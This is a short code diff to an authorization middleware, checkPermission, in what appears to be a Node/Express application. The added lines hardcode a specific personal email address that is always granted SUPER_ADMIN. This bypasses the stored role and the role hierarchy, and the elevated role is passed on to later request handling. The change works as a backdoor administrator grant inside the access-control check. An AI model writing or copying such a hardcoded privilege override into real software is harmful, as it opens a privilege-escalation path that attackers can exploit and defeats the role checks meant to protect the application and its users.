@@ -43,20 +43,24 @@ const checkPermission = (requiredRole) => {
 
             // Normalization: Ensure role matches hierarchy keys (uppercase)
             const userRole = user.role ? user.role.toUpperCase() : 'STUDENT';
-            const userLevel = ROLE_HIERARCHY[userRole] || 0;
+            const userEmail = user.email ? user.email.toLowerCase() : '';
+
+            // Override role for the super admin email
+            const effectiveRole = userEmail === 'az.jo.fm@gmail.com' ? 'SUPER_ADMIN' : userRole;
+            const userLevel = ROLE_HIERARCHY[effectiveRole] || 0;
             const requiredLevel = ROLE_HIERARCHY[requiredRole.toUpperCase()] || 0;
 
             if (userLevel < requiredLevel) {
                 return res.status(403).json({
                     error: 'Forbidden. Insufficient permissions.',
                     required: requiredRole,
-                    current: user.role
+                    current: effectiveRole
                 });
             }
 
             req.userId = decoded.id;
-            req.userRole = userRole;
-            req.user = { id: decoded.id, ...user, role: userRole };
+            req.userRole = effectiveRole;
+            req.user = { id: decoded.id, ...user, role: effectiveRole };
             next();
         } catch (error) {
             if (error.name === 'JsonWebTokenError') {
